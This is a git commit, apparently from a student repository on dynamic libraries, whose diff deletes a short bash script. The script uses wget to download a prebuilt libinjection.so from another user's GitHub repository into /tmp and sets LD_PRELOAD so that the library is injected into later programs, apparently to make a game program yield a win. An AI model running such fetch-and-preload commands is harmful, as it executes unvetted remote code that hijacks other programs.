bcfe2a3965658195189a9ecbda5133c67355f2d5
hariti asmae <haritiasmaa74@gmail.com>
2023-06-20 04:40:38 -0700

    .

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-wget -P /tmp/ https://raw.githubusercontent.com/eddybrownent/alx-low_level_programming/master/0x18-dynamic_libraries/libinjection.so
-export LD_PRELOAD="/tmp/libinjection.so"
